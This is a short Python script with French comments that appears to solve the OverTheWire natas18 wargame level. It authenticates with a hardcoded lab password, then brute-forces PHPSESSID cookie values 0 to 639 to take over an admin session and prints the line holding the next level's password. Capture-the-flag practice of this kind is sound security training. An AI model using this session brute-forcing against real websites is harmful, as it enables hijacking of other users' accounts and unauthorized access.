import requests  # Pour la gestion des requêtes
import tqdm      # Pour afficher la barre de progression

# variable pour la connexion au site
url = "http://natas18.natas.labs.overthewire.org"
url2 = "http://natas18.natas.labs.overthewire.org/index.php"

# Connexion au site
s = requests.Session()
s.auth = ('natas18', '8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq')
r = s.get(url)
raw_response=""

# Brute force du Cookie de 0 à 640
for x in tqdm.tqdm(range(640)):
    cookies = dict(PHPSESSID=str(x))
    r = s.get(url2, cookies=cookies)
    if "Login as an admin to retrieve" in r.text:
        pass
    else:
        raw_response =  r.text
        break

# Extraction des lignes
lines = raw_response.split('\n')
natas19_line = None

# Si Password trouvé on extrait la ligne.
for line in lines:
    if "Password" in line:
        natas19_line = line
        break

# Affichage de la ligne contenant "Password" s'il a été trouvé
if natas19_line:
    print("Ligne contenant 'Password:", natas19_line)
else:
    print("Le mot 'natas19' n'a pas été trouvé dans raw_response.")
